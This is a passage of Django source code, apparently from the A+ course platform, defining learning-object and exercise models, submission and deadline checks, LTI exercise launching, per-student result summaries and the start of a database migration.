    description = models.TextField(blank=True,
        help_text=_(""Internal description is not presented on site.""))
    use_wide_column = models.BooleanField(default=False,
        help_text=_(""Remove the third info column for more space.""))

    service_url = models.CharField(max_length=255, blank=True)
    exercise_info = JSONField(blank=True)
    model_answers = models.TextField(blank=True,
        help_text=_(""List model answer files as protected URL addresses.""))
    templates = models.TextField(blank=True,
        help_text=_(""List template files as protected URL addresses.""))

    # Keep this to support ExerciseWithAttachment
    # Maybe this should inject extra content to any exercise
    content = models.TextField(blank=True)

    objects = LearningObjectManager()

    class Meta:
        app_label = ""exercise""
        ordering = ['course_module', 'order', 'id']
        unique_together = ['course_module', 'parent', 'url']

    def clean(self):
        """"""
        Validates the model before saving (standard method used in Django admin).
        """"""
        super().clean()
        errors = {}
        RESERVED = (""submissions"", ""plain"", ""info"")
        if self.url in RESERVED:
            errors['url'] = _(""Taken words include: {}"").format("", "".join(RESERVED))
        if self.course_module.course_instance != self.category.course_instance:
            errors['category'] = _('Course_module and category must belong to the same course instance.')
        if self.parent:
            if self.parent.course_module != self.course_module:
                errors['parent'] = _('Cannot select parent from another course module.')
            if self.parent.id == self.id:
                errors['parent'] = _('Cannot select self as a parent.')
        if errors:
            raise ValidationError(errors)

    def save(self, *args, **kwargs):
        super().save(*args, **kwargs)
        # Trigger LearningObject post save signal for extending classes.
        cls = self.__class__
        while cls.__bases__:
            cls = cls.__bases__[0]
            if cls.__name__ == 'LearningObject':
                signals.post_save.send(sender=cls, instance=self)

    def delete(self, *args, **kwargs):
        super().delete(*args, **kwargs)
        # Trigger LearningObject post delete signal for extending classes.
        cls = self.__class__
        while cls.__bases__:
            cls = cls.__bases__[0]
            if cls.__name__ == 'LearningObject':
                signals.post_delete.send(sender=cls, instance=self)

    def __str__(self):
        if self.order >= 0:
            if self.course_instance.content_numbering == CourseInstance.CONTENT_NUMBERING.ARABIC:
                number = self.number()
                if self.course_instance.module_numbering in (
                        CourseInstance.CONTENT_NUMBERING.ARABIC,
                        CourseInstance.CONTENT_NUMBERING.HIDDEN,
                    ):
                    return ""{:d}.{} {}"".format(self.course_module.order, number, self.name)
                return ""{} {}"".format(number, self.name)
            elif self.course_instance.content_numbering == CourseInstance.CONTENT_NUMBERING.ROMAN:
                return ""{} {}"".format(roman_numeral(self.order), self.name)
        return self.name

    def number(self):
        return ""."".join([str(o.order) for o in self.parent_list()])

    def parent_list(self):
        if not hasattr(self, '_parents'):
            def recursion(obj, parents):
                if not obj is None:
                    return recursion(obj.parent, [obj] + parents)
                return parents
            self._parents = recursion(self.parent, [self])
        return self._parents

    @property
    def course_instance(self):
        return self.course_module.course_instance

    @property
    def is_submittable(self):
        return False

    def is_empty(self):
        return not self.service_url and self.as_leaf_class()._is_empty()

    def _is_empty(self):
        return True

    def is_open(self, when=None):
        return self.course_module.is_open(when=when)

    def is_after_open(self, when=None):
        return self.course_module.is_after_open(when=when)

    def is_closed(self, when=None):
        return self.course_module.is_closed(when=when)

    @property
    def can_show_model_solutions(self):
        """"""Can model solutions be shown to students?
        This method checks only the module deadline and ignores personal
        deadline extensions.
        """"""
        return self.is_closed() and not self.course_instance.is_on_lifesupport() and not self.course_instance.is_archived()

    def can_show_model_solutions_to_student(self, student):
        """"""Can model solutions be shown to the given student (User)?
        This method checks personal deadline extensions in addition to
        the common module deadline.
        """"""
        # The old version of this method was defined in this LearningObject class
        # even though only exercises could be submitted to and have model solutions.
        # Class BaseExercise overrides this method since deadline deviations are
        # defined only for them, not learning objects.
        return student.is_authenticated and self.can_show_model_solutions

    def get_path(self):
        return ""/"".join([o.url for o in self.parent_list()])

    ABSOLUTE_URL_NAME = ""exercise""

    def get_url_kwargs(self):
        return dict(exercise_path=self.get_path(), **self.course_module.get_url_kwargs())

    def get_display_url(self):
        if self.status == self.STATUS.UNLISTED and self.parent:
            return ""{}#chapter-exercise-{:d}"".format(
                self.parent_list()[-2].get_absolute_url(),
                self.order
            )
        return self.get_absolute_url()

    def get_submission_list_url(self):
        return self.get_url(""submission-list"")

    def load(self, request, students, url_name=""exercise""):
        """"""
        Loads the learning object page.
        """"""
        page = ExercisePage(self)
        if not self.service_url:
            return page
        language = get_language()
        cache = ExerciseCache(self, language, request, students, url_name)
        page.head = cache.head()
        page.content = cache.content()
        page.is_loaded = True
        return page

    def load_page(self, language, request, students, url_name, last_modified=None):
        return load_exercise_page(
            request,
            self.get_load_url(language, request, students, url_name),
            last_modified,
            self
        )

    def get_load_url(self, language, request, students, url_name=""exercise""):
        return update_url_params(pick_localized(self.service_url, language), {
            'lang': language,
        })

    def get_models(self):
        entries = pick_localized(self.model_answers, get_language())
        return [(url,url.split('/')[-1]) for url in entries.split()]

    def get_templates(self):
        entries = pick_localized(self.templates, get_language())
        return [(url,url.split('/')[-1]) for url in entries.split()]


def invalidate_exercise(sender, instance, **kwargs):
    for language,_ in settings.LANGUAGES:
        ExerciseCache.invalidate(instance, modifiers=[language])


# Automatically invalidate cached exercise html when edited.
post_save.connect(invalidate_exercise, sender=LearningObject)
post_delete.connect(invalidate_exercise, sender=LearningObject)


class LearningObjectDisplay(models.Model):
    """"""
    Records views of learning objects.
    """"""
    learning_object = models.ForeignKey(LearningObject, on_delete=models.CASCADE)
    profile = models.ForeignKey(UserProfile, on_delete=models.CASCADE)
    timestamp = models.DateTimeField(auto_now_add=True)


class CourseChapter(LearningObject):
    """"""
    Chapters can offer and organize learning material as one page chapters.
    """"""
    generate_table_of_contents = models.BooleanField(default=False)

    objects = models.Manager()

    def _is_empty(self):
        return not self.generate_table_of_contents


class BaseExercise(LearningObject):
    """"""
    The common parts for all exercises.
    """"""
    # Timing enumeration is only used as a return value.
    TIMING = Enum([
        ('CLOSED_BEFORE', 0, ""Submissions are not yet accepted""),
        ('OPEN', 1, ""Normal submissions are accepted""),
        ('LATE', 2, ""Late submissions are accepted""),
        ('UNOFFICIAL', 3, ""Only unofficial submissions are accepted""),
        ('CLOSED_AFTER', 4, ""Submissions are not anymore accepted""),
        ('ARCHIVED', 5, ""Course is archived and so are exercises""),
    ])

    SUBMIT_STATUS = Enum([
        ('ALLOWED', 1, ''),
        ('CANNOT_ENROLL', 2, 'You cannot enroll in the course.'),
        ('NOT_ENROLLED', 3, 'You must enroll at course home.'),
        ('INVALID_GROUP', 4, 'The selected group is not acceptable.'),
        ('AMOUNT_EXCEEDED', 5, 'You have used the allowed amount of submissions.'),
        ('INVALID', 999, 'You cannot submit for an unspecified reason.'),
    ])

    allow_assistant_viewing = models.BooleanField(default=True)
    allow_assistant_grading = models.BooleanField(default=False)
    min_group_size = models.PositiveIntegerField(default=1)
    max_group_size = models.PositiveIntegerField(default=1)
    max_submissions = models.PositiveIntegerField(default=10)
    max_points = models.PositiveIntegerField(default=100)
    points_to_pass = models.PositiveIntegerField(default=40)
    difficulty = models.CharField(max_length=32, blank=True)

    objects = models.Manager()

    class Meta:
        app_label = 'exercise'

    def clean(self):
        """"""
        Validates the model before saving (standard method used in Django admin).
        """"""
        super().clean()
        errors = {}
        if self.points_to_pass > self.max_points:
            errors['points_to_pass'] = _(""Points to pass cannot be greater than max_points."")
        if self.min_group_size > self.max_group_size:
            errors['min_group_size'] = _(""Minimum group size cannot exceed maximum size."")
        if errors:
            raise ValidationError(errors)

    @property
    def is_submittable(self):
        return True

    def get_timing(self, students, when):
        module = self.course_module
        # Check the course instance archive time first so that submissions
        # are never accepted after it.
        dl = module.course_instance.archive_start
        if module.course_instance.is_archived(when=when):
            return self.TIMING.ARCHIVED, dl

        if not module.is_after_open(when=when):
            return self.TIMING.CLOSED_BEFORE, module.opening_time

        category = self.category
        if module.is_open(when=when) or category.confirm_the_level:
            return self.TIMING.OPEN, module.closing_time

        deviation = self.one_has_deadline_deviation(students)
        dl = deviation.get_new_deadline() if deviation else None
        if dl and when <= dl:
            if deviation.without_late_penalty:
                return self.TIMING.OPEN, dl
            return self.TIMING.LATE, dl

        if module.is_late_submission_open(when=when):
            return self.TIMING.LATE, module.late_submission_deadline

        dl = dl or (module.late_submission_deadline
            if module.late_submissions_allowed else module.closing_time)
        if category.accept_unofficial_submits:
            return self.TIMING.UNOFFICIAL, dl

        return self.TIMING.CLOSED_AFTER, dl

    def delta_in_minutes_from_closing_to_date(self, future_date):
        module_close = self.course_module.closing_time
        # module_close is in utc format 2018-04-10 23:59:00+00:00
        # while future_date from the teacher submitted form might
        # be in different formet, eg. 2018-05-15 23:59:00+03:00
        # -> convert future_date to same format as module_close
        string_date = str(future_date)[:16]
        converted = timezone.make_aware(
                datetime.datetime.strptime(string_date, '%Y-%m-%d %H:%M'),
                timezone.get_current_timezone())
        delta = converted - module_close
        return delta.days * 24 * 60 + delta.seconds // 60

    def one_has_access(self, students, when=None):
        """"""
        Checks if any of the users can submit taking the granted extra time
        in consideration.
        """"""
        timing,d = self.get_timing(students, when or timezone.now())
        if timing == self.TIMING.OPEN:
            return True,[]
        if timing == self.TIMING.LATE:
            # xgettext:no-python-format
            return True,[_(""Deadline for the exercise has passed. Late submissions are allowed until {date} but points are only worth {percent:d}% of normal."").format(
                date=date_format(d),
                percent=self.course_module.get_late_submission_point_worth(),
            )]
        if timing == self.TIMING.UNOFFICIAL:
            return True,[_(""Deadline for the exercise has passed ({date}). You may still submit to receive feedback, but your current grade will not change."").format(
                date=date_format(d)
            )]
        if timing == self.TIMING.CLOSED_BEFORE:
            return False,[_(""The exercise opens {date} for submissions."").format(
                date=date_format(d)
            )]
        if timing == self.TIMING.CLOSED_AFTER:
            return False,[_(""Deadline for the exercise has passed ({date})."").format(
                date=date_format(d)
            )]
        if timing == self.TIMING.ARCHIVED:
            return False,[_(""This course has been archived ({date})."").format(
                date=date_format(d)
            )]
        return False,[""ERROR""]

    def one_has_deadline_deviation(self, students):
        deviation = None
        for profile in students:
            for d in self.deadlineruledeviation_set.filter(submitter=profile):
                if not deviation\
                        or d.get_new_deadline() > deviation.get_new_deadline():
                    deviation = d
        return deviation

    def number_of_submitters(self):
        return self.course_instance.students\
            .filter(submissions__exercise=self).distinct().count()

    def get_submissions_for_student(self, user_profile, exclude_errors=False):
        if exclude_errors:
            submissions = user_profile.submissions.exclude_errors()
        else:
            submissions = user_profile.submissions
        return submissions.filter(exercise=self)

    def max_submissions_for_student(self, user_profile):
        """"""
        Calculates student specific max_submissions considering the possible
        MaxSubmissionsRuleDeviation for this student.
        """"""
        deviation = self.maxsubmissionsruledeviation_set \
            .filter(submitter=user_profile).first()
        if deviation:
            return self.max_submissions + deviation.extra_submissions
        return self.max_submissions

    def one_has_submissions(self, students):
        if self.max_submissions == 0:
            return True, []
        submission_count = 0
        for profile in students:
            # The students are in the same group, therefore, each student should
            # have the same submission count. However, max submission deviation
            # may be set for only one group member.
            submission_count = self.get_submissions_for_student(profile, True).count()
            if submission_count < self.max_submissions_for_student(profile):
                return True, []
        max_unofficial_submissions = settings.MAX_UNOFFICIAL_SUBMISSIONS
        if self.category.accept_unofficial_submits and \
                (max_unofficial_submissions == 0 or submission_count < max_unofficial_submissions):
            # Note: time is not checked here, but unofficial submissions are
            # not allowed if the course archive time has passed.
            # The caller must check the time limits too.
            return True, [_('You have used the allowed amount of submissions for this exercise. You may still submit to receive feedback, but your current grade will not change.')]
        return False, [_('You have used the allowed amount of submissions for this exercise.')]

    def no_submissions_left(self, students):
        if self.max_submissions == 0:
            return False
        for profile in students:
            if self.get_submissions_for_student(profile, True).count() \
                    <= self.max_submissions_for_student(profile):
                return False
        return True

    def check_submission_allowed(self, profile, request=None):
        """"""
        Checks whether the submission to this exercise is allowed for the given
        user and generates a list of warnings.

        @return: (success_flag, warning_message_list)
        """"""
        success, warnings, students = self._check_submission_allowed(profile, request)
        return success, list(str(w) for w in warnings), students

    def _check_submission_allowed(self, profile, request=None):
        students = [profile]
        warnings = []

        # Let course module settings decide submissionable state.
        #if self.course_instance.ending_time < timezone.now():
        #    warnings.append(_('The course is archived. Exercises are offline.'))
        #    return False, warnings, students

        # Check enrollment requirements.
        enrollment = self.course_instance.get_enrollment_for(profile.user)
        if self.status in (
            LearningObject.STATUS.ENROLLMENT,
            LearningObject.STATUS.ENROLLMENT_EXTERNAL,
        ):
            if not self.course_instance.is_enrollment_open():
                return (self.SUBMIT_STATUS.CANNOT_ENROLL,
                        [_('The enrollment is not open.')],
                        students)
            if not self.course_instance.is_enrollable(profile.user):
                return (self.SUBMIT_STATUS.CANNOT_ENROLL,
                        [_('You cannot enroll in the course.')],
                        students)
        elif not enrollment:
            if self.course_instance.is_course_staff(profile.user):
                return (self.SUBMIT_STATUS.ALLOWED,
                        [_('Staff can submit exercises without enrolling.')],
                        students)
            return (self.SUBMIT_STATUS.NOT_ENROLLED,
                    [_('You must enroll in the course to submit exercises.')],
                    students)

        # Support group id from post or currently selected group.
        group = None
        group_id = request.POST.get(""_aplus_group"") if request else None
        if not group_id is None:
            try:
                gid = int(group_id)
                if gid > 0:
                    group = profile.groups.filter(
                        course_instance=self.course_instance,
                        id=gid).first()
            except ValueError:
                pass
        elif enrollment and enrollment.selected_group:
            group = enrollment.selected_group

        # Check groups cannot be changed after submitting.
        submission = self.get_submissions_for_student(profile).first()
        if submission:
            if self._detect_group_changes(profile, group, submission):
                msg = _(""Group can only change between different exercises."")
                warning = _('You have previously submitted this '
                            'exercise {with_group}. {msg}')
                if submission.submitters.count() == 1:
                    warning = warning.format(with_group=_('alone'), msg=msg)
                else:
                    collaborators = StudentGroup.format_collaborator_names(
                            submission.submitters.all(), profile)
                    with_group = _('with {}').format(collaborators)
                    warning = warning.format(with_group=with_group, msg=msg)
                warnings.append(warning)
                return self.SUBMIT_STATUS.INVALID_GROUP, warnings, students

        elif self._detect_submissions(profile, group):
            warnings.append(_('{collaborators} already submitted to this exercise in a different group.').format(
                collaborators=group.collaborator_names(profile)))
            return self.SUBMIT_STATUS.INVALID_GROUP, warnings, students

        # Get submitters.
        if group:
            students = list(group.members.all())

        # Check group size.
        if not (self.min_group_size <= len(students) <= self.max_group_size):
            if self.max_group_size == self.min_group_size:
                size = ""{:d}"".format(self.min_group_size)
            else:
                size = ""{:d}-{:d}"".format(self.min_group_size, self.max_group_size)
            warnings.append(
                _(""This exercise must be submitted in groups of {size} students."")
                .format(size=size))

        access_ok,access_warnings = self.one_has_access(students)
        is_staff = all(self.course_instance.is_course_staff(p.user) for p in students)
        ok = (access_ok and len(warnings) == 0) or is_staff
        all_warnings = warnings + access_warnings
        if not ok:
            if len(all_warnings) == 0:
                all_warnings.append(_(
                    'Cannot submit exercise due to unknown reason. If you '
                    'think this is an error, please contact course staff.'))
            return self.SUBMIT_STATUS.INVALID, all_warnings, students

        submit_limit_ok, submit_limit_warnings = self.one_has_submissions(students)
        if not submit_limit_ok and not is_staff:
            # access_warnings are not needed here
            return (self.SUBMIT_STATUS.AMOUNT_EXCEEDED,
                    submit_limit_warnings,
                    students)

        return self.SUBMIT_STATUS.ALLOWED, all_warnings + submit_limit_warnings, students

    def _detect_group_changes(self, profile, group, submission):
        submitters = list(submission.submitters.all())
        if group:
            return not group.equals(submitters)
        else:
            return len(submitters) > 1 or submitters[0] != profile

    def _detect_submissions(self, profile, group):
        if group:
            return not all((
                len(self.get_submissions_for_student(p)) == 0
                for p in group.members.all() if p != profile
            ))
        return False

    def get_total_submitter_count(self):
        return UserProfile.objects \
            .filter(submissions__exercise=self) \
            .distinct().count()

    def get_load_url(self, language, request, students, url_name=""exercise""):
        if self.id:
            if request.user.is_authenticated:
                user = request.user
                submission_count = self.get_submissions_for_student(user.userprofile).count()
            else:
                user = None
                submission_count = 0
            # Make grader async URL for the currently authenticated user.
            # The async handler will handle group selection at submission time.
            submission_url = update_url_params(
                api_reverse(""exercise-grader"", kwargs={
                    'exercise_id': self.id
                }),
                get_graderauth_exercise_params(self, user),
            )
            return self._build_service_url(
                language, request, students,
                submission_count + 1, url_name, submission_url
            )
        return super().get_load_url(language, request, students, url_name)

    def grade(self, request, submission, no_penalties=False, url_name=""exercise""):
        """"""
        Loads the exercise feedback page.
        """"""
        language = get_language()
        submission_url = update_url_params(
            api_reverse(""submission-grader"", kwargs={
                'submission_id': submission.id
            }),
            get_graderauth_submission_params(submission),
        )
        url = self._build_service_url(
            language, request, submission.submitters.all(),
            submission.ordinal_number(), url_name, submission_url
        )
        return load_feedback_page(
            request, url, self, submission, no_penalties=no_penalties
        )

    def modify_post_parameters(self, data, files, user, students, request, url):
        """"""
        Allows to modify submission POST parameters before they are sent to
        the grader. Extending classes may implement this function.
        """"""
        pass

    def _build_service_url(self, language, request, students, ordinal_number, url_name, submission_url):
        """"""
        Generates complete URL with added parameters to the exercise service.
        """"""
        uid_str = '-'.join(sorted(str(profile.user.id) for profile in students)) if students else ''
        auri = (
            settings.OVERRIDE_SUBMISSION_HOST + submission_url
            if settings.OVERRIDE_SUBMISSION_HOST
            else request.build_absolute_uri(submission_url)
        )
        return update_url_params(pick_localized(self.service_url, language), {
            ""max_points"": self.max_points,
            ""max_submissions"": self.max_submissions,
            ""submission_url"": auri,
            ""post_url"": request.build_absolute_uri(str(self.get_url(url_name))),
            ""uid"": uid_str,
            ""ordinal_number"": ordinal_number,
            ""lang"": language,
        })

    @property
    def can_regrade(self):
        """"""Can this exercise be regraded in the assessment service, i.e.,
        can previous submissions be uploaded again for grading?""""""
        return True

    def can_show_model_solutions_to_student(self, student):
        result = super().can_show_model_solutions_to_student(student)
        if not result:
            return False

        submission = self.get_submissions_for_student(student.userprofile).first()
        if submission:
            # When the exercise uses group submissions, a deadline deviation
            # may be granted to only one group member, but it affects the whole
            # group. Therefore, we must check deadline deviations for all group
            # members. All submissions to one exercise are made with the same group.
            students = list(submission.submitters.all())
        else:
            students = [student.userprofile]

        # Student may not view model solutions if he can still submit and gain
        # points due to a personal deadline extension.
        deviation = self.one_has_deadline_deviation(students)
        if deviation:
            return timezone.now() > deviation.get_new_deadline()
        return True


class LTIExercise(BaseExercise):
    """"""
    Exercise launched by LTI or optionally amending A+ protocol with LTI data.
    """"""
    lti_service = models.ForeignKey(LTIService, on_delete=models.CASCADE)
    context_id = models.CharField(max_length=128, blank=True,
        help_text=_('Default: [hostname]/[course:url]/[instance:url]/'))
    resource_link_id = models.CharField(max_length=128, blank=True,
        help_text=_('Default: [aplusexercise:id]'))
    resource_link_title = models.CharField(max_length=128, blank=True,
        help_text=_('Default: the menu label of the LTI service'))
    aplus_get_and_post = models.BooleanField(default=False,
        help_text=_('Perform GET and POST from A+ to custom service URL with LTI data appended.'))
    open_in_iframe = models.BooleanField(default=False,
        help_text=_('Open the exercise in an iframe inside the A+ page instead of a new window.'))

    objects = models.Manager()

    def clean(self):
        """"""
        Validates the model before saving (standard method used in Django admin).
        """"""
        super().clean()
        # If service_url is defined and is an absolute URL, it must be in the
        # same domain as the LTI service.
        # Relative URLs are joined to the URL of the LTI service.
        if self.service_url:
            uri = urlsplit(self.service_url)
            if uri.netloc:
                if uri.netloc != urlsplit(self.lti_service.url).netloc:
                    raise ValidationError({
                        'service_url': _(""Domain of Service URL must match the domain of LTI Service or it should only be the path.""),
                    })
                # Save only the URL path in the database without the domain
                self.service_url = uri._replace(scheme='', netloc='').geturl()

    def load(self, request, students, url_name=""exercise""):
        if not self.lti_service.enabled:
            messages.error(request, _(""The exercise can not be loaded because the external LTI service has been disabled.""))
            raise PermissionDenied(""The LTI service is disabled."")

        if self.aplus_get_and_post:
            return super().load(request, students, url_name=url_name)

        if not students:
            return ExercisePage(self)

        url = self.lti_service.get_final_url(self.service_url)
        lti = self._get_lti(students[0].user, students, request)

        # Render launch button.
        page = ExercisePage(self)
        page.content = self.content
        template = loader.get_template('external_services/_launch.html')
        page.content += template.render(Context({
            'service': self.lti_service,
            'service_label': self.lti_service.menu_label,
            'url': url,
            'parameters': lti.sign_post_parameters(url),
            'parameters_hash': lti.get_checksum_of_parameters(only_user_and_course_level_params=True),
            'exercise': self,
            'is_course_staff': self.course_instance.is_course_staff(request.user),
            'site': '/'.join(url.split('/')[:3]),
        }))
        return page

    def _get_lti(self, user, students, request, add=None):
        try:
            return CustomStudentInfoLTIRequest(
                self.lti_service,
                user,
                students,
                self.course_instance,
                request,
                self.resource_link_title or self.lti_service.menu_label or self.name,
                self.context_id or None,
                self.resource_link_id or ""aplusexercise{:d}"".format(self.id or 0),
                add,
                exercise=self,
            )
        except PermissionDenied:
            raise

    def get_load_url(self, language, request, students, url_name=""exercise""):
        url = super().get_load_url(language, request, students, url_name)
        if self.lti_service and students:
            lti = self._get_lti(students[0].user, [], request)
            return lti.sign_get_query(url)
        return url

    def modify_post_parameters(self, data, files, user, students, request, url):
        literals = {key: str(val[0]) for key,val in data.items()}
        lti = self._get_lti(user, students, request, add=literals)
        data.update(lti.sign_post_parameters(url))

    def _build_service_url(self, *args, **kwargs):
        url = super()._build_service_url(*args, **kwargs)
        if url and url.startswith('//') or '://' in url:
            return url
        return self.lti_service.get_final_url(url)

    @property
    def can_regrade(self):
        # the LTI protocol does not support regrading in the A+ way
        # (A+ would upload a submission to the service and expect it to be graded)
        return False


class StaticExercise(BaseExercise):
    """"""
    Static exercises are used for storing submissions on the server, but not automatically
    assessing them. Static exercises may be retrieved by other services through the API.

    Chapters should be used for non submittable content.

    Should be deprecated as a contradiction to A+ ideology.
    """"""
    exercise_page_content = models.TextField()
    submission_page_content = models.TextField()

    objects = models.Manager()

    def load(self, request, students, url_name=""exercise""):
        page = ExercisePage(self)
        page.content = self.exercise_page_content
        return page

    def grade(self, request, submission, no_penalties=False, url_name=""exercise""):
        page = ExercisePage(self)
        page.content = self.submission_page_content
        page.is_accepted = True
        return page

    def _is_empty(self):
        return not bool(self.exercise_page_content)

    @property
    def can_regrade(self):
        return False


def build_upload_dir(instance, filename):
    """"""
    Returns the path to a directory where the attachment file should be saved.
    This is called every time a new ExerciseWithAttachment model is created.

    @param instance: the ExerciseWithAttachment object
    @param filename: the actual name of the submitted file
    @return: a path where the file should be stored, relative to MEDIA_ROOT directory
    """"""
    return ""course_instance_{:d}/exercise_attachment_{:d}/{}"".format(
        instance.course_instance.id,
        instance.id,
        safe_file_name(filename)
    )


class ExerciseWithAttachment(BaseExercise):
    """"""
    ExerciseWithAttachment is an exercise type where the exercise instructions
    are stored locally and the exercise will be graded by sending an additional
    attachment to the grader together with other POST data. The exercise page
    will contain a submission form for the files the user should submit if the
    files to be submitted are defined. Otherwise the instructions must contain
    the submission form.

    Could be deprecated as a contradiction to A+ purist ideology.
    """"""
    files_to_submit = models.CharField(max_length=200, blank=True,
        help_text=_(""File names that user should submit, use pipe character to separate files""))
    attachment = models.FileField(upload_to=build_upload_dir)

    objects = models.Manager()

    class Meta:
        verbose_name_plural = ""exercises with attachment""

    def get_files_to_submit(self):
        """"""
        Returns a list of the file names that user should submit with this exercise.
        """"""
        if len(self.files_to_submit.strip()) == 0:
            return []
        else:
            files = self.files_to_submit.split(""|"")
            return [filename.strip() for filename in files]

    def load(self, request, students, url_name=""exercise""):
        page = ExercisePage(self)
        page.content = self.content

        # Adds the submission form to the content if there are files to be
        # submitted. A template is used to avoid hard-coded HTML here.
        if self.get_files_to_submit():
            template = loader.get_template('exercise/model/_file_submit_form.html')
            context = Context({'files' : self.get_files_to_submit()})
            page.content += template.render(context)

        return page

    def modify_post_parameters(self, data, files, user, students, request, url):
        """"""
        Adds the attachment file to post parameters.
        """"""
        import os
        files['content_0'] = (
            os.path.basename(self.attachment.path),
            open(self.attachment.path, ""rb"")
        )


def _delete_file(sender, instance, **kwargs):
    """"""
    Deletes exercise attachment file after the exercise in database is removed.
    """"""
    default_storage.delete(instance.attachment.path)


def _clear_cache(sender, instance, **kwargs):
    """"""
    Clears parent's cached html if any.
    """"""
    if instance.parent:
        ExerciseCache.invalidate(instance.parent)


post_delete.connect(_delete_file, ExerciseWithAttachment)
post_save.connect(_clear_cache, LearningObject)
/n/n/nexercise/exercise_summary.py/n/nimport itertools

from django.core.exceptions import ObjectDoesNotExist
from django.db.models import Max

from course.models import StudentGroup
from .cache.content import CachedContent
from .models import BaseExercise, Submission


class UserExerciseSummary(object):
    """"""
    UserExerciseSummary summarises the submissions of a certain user and
    exercise. It calculates some characterizing figures such as the number of
    submissions and reference to the best submission. See the public methods
    for more.
    """"""
    def __init__(self, exercise, user=None):
        self.exercise = exercise
        self.max_points = getattr(exercise, 'max_points', 0)
        self.difficulty = getattr(exercise, 'difficulty', '')
        self.points_to_pass = getattr(exercise, 'points_to_pass', 0)
        self.user = user
        self.submissions = []
        self.submission_count = 0
        self.best_submission = None
        self.graded = False
        self.unofficial = False

        if self.user and self.user.is_authenticated:
            self.submissions = list(exercise.get_submissions_for_student(
                user.userprofile))
            for s in self.submissions:
                if not s.status in (
                    Submission.STATUS.ERROR,
                    Submission.STATUS.REJECTED,
                ):
                    self.submission_count += 1
                    if (
                        s.status == Submission.STATUS.READY and (
                            self.best_submission is None
                            or self.unofficial
                            or s.grade > self.best_submission.grade
                        )
                    ):
                        self.best_submission = s
                        self.unofficial = False
                        self.graded = True
                    elif (
                        s.status == Submission.STATUS.UNOFFICIAL and (
                            not self.graded
                            or (
                                self.unofficial
                                and s.grade > self.best_submission.grade
                            )
                        )
                    ):
                        self.best_submission = s
                        self.unofficial = True

    def get_submission_count(self):
        return self.submission_count

    def get_submissions(self):
        return self.submissions

    def get_best_submission(self):
        return self.best_submission

    def get_points(self):
        return self.best_submission.grade if self.best_submission and not self.unofficial else 0

    def get_penalty(self):
        return self.best_submission.late_penalty_applied if self.best_submission else None

    def is_missing_points(self):
        return self.get_points() < self.points_to_pass

    def is_full_points(self):
        return self.get_points() >= self.max_points

    def is_passed(self):
        return not self.is_missing_points()

    def is_submitted(self):
        return self.submission_count > 0

    def is_graded(self):
        return self.graded

    def is_unofficial(self):
        return self.unofficial

    def get_group(self):
        if self.submission_count > 0:
            s = self.submissions[0]
            if s.submitters.count() > 0:
                return StudentGroup.get_exact(
                    self.exercise.course_instance,
                    s.submitters.all()
                )
        return None

    def get_group_id(self):
        group = self.get_group()
        return group.id if group else 0


class ResultTable:
    """"""
    WARNING: Constructing this class is a heavy database operation.

    Models the table displaying the grades for each student on each exercise.
    Result tables are generated dynamically when needed and not stored
    in a database.
    """"""

    def __init__(self, course_instance):
        """"""
        Instantiates a new ResultTable for the given course instance.
        After initialization the table is filled with grades from the database.
        """"""
        self.course_instance = course_instance

        # Exercises on the course.
        self.exercises = list(self.__get_exercises())
        self.categories = course_instance.categories.all()

        # Students on the course.
        self.students = list(course_instance.get_student_profiles())

        # Empty results table.
        self.results = {
            student.id: {
                exercise.id: None for exercise in self.exercises
            } for student in self.students
        }
        self.results_by_category = {
            student.id: {
                category.id: 0 for category in self.categories
            } for student in self.students
        }

        # Fill the results with the data from the database.
        self.__collect_student_grades()


    def __get_exercises(self):
        content = CachedContent(self.course_instance)

        def get_descendant_ids(node):
            children = node['children']
            if children:
                return itertools.chain.from_iterable(
                    [get_descendant_ids(child) for child in children])
            return (node['id'],)

        root_node = { 'children': content.modules() }
        ids = get_descendant_ids(root_node)

        # Loop until end of ids raises StopIteration
        while True:
            id = next(ids)
            try:
                yield BaseExercise.objects.get(learningobject_ptr_id=id)
            except ObjectDoesNotExist:
                continue


    def __collect_student_grades(self):
        """"""
        Helper for the __init__.
        This method puts the data from the database in to the results table.
        """"""
        submissions = list(Submission.objects \
            .filter(
                exercise__course_module__course_instance=self.course_instance,
                status=Submission.STATUS.READY
            ).values(""submitters"", ""exercise"", ""exercise__category"") \
            .annotate(best=Max(""grade"")) \
            .order_by()) # Remove default ordering.
        for submission in submissions:
            student_id = submission[""submitters""]
            if student_id in self.results:
                self.results[student_id][submission[""exercise""]] = submission[""best""]
                self.results_by_category[student_id][submission[""exercise__category""]] += submission[""best""]


    def results_for_template(self):
        """"""
        Converts the results data into a form that is convenient for to use in a
        template. The columns of the table ordered according to the order of the
        exercises in self.exercises.
        """"""
        for_template = []
        for student in self.students:
            grades = [ self.results[student.id][exercise.id] \
                for exercise in self.exercises ]
            total = sum(g for g in grades if g is not None)
            for_template.append((student, grades, total))
        return for_template


    def max_sum(self):
        return sum(e.max_points for e in self.exercises)
/n/n/nexercise/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-


from django.db import models, migrations
from django.utils import timezone
import datetime
import exercise.submission_models
import lib.helpers
import exercise.exercise_models
import lib.fields


class Migration(migrations.Migration):

    dependencies = [
        ('inheritance', '0001_initial'),
        ('userprofile', '0001_initial'),
        ('course', '0001_initial'),
    ]

    operations = [
        migrations.CreateModel(
            name='CourseModule',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('name', models.CharField(max_length=255)),
                ('points_to_pass', models.PositiveIntegerField(default=0)),
                ('introduction', models.TextField(blank=True)),
                ('opening_time', models.DateTimeField(default=timezone.now)),
                ('closing_time', models.DateTimeField(default=timezone.now)),
                ('late_submissions_allowed', models.BooleanField(default=False)),
                ('late_submission_deadline', models.DateTimeField(default=timezone.now)),
                ('late_submission_penalty', lib.fields.PercentField(default=0.5, help_text='Multiplier of points to reduce, as decimal. 0.1 = 10%')),
                ('course_instance', models.ForeignKey(related_name='course_modules', to='course.CourseInstance', on_delete=models.CASCADE)),
            ],
            options={
                'ordering': ['closing_time', 'id'],
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='DeadlineRuleDeviation',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('extra_minutes', models.IntegerField()),
            ],
            options={
                'abstract': False,
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='LearningObject',
            fields=[
                ('modelwithinheritance_ptr', models.OneToOneField(
                    to='inheritance.ModelWithInheritance', on_delete=models.CASCADE,
                    parent_link=True, auto_created=True, primary_key=True, serialize=False)),
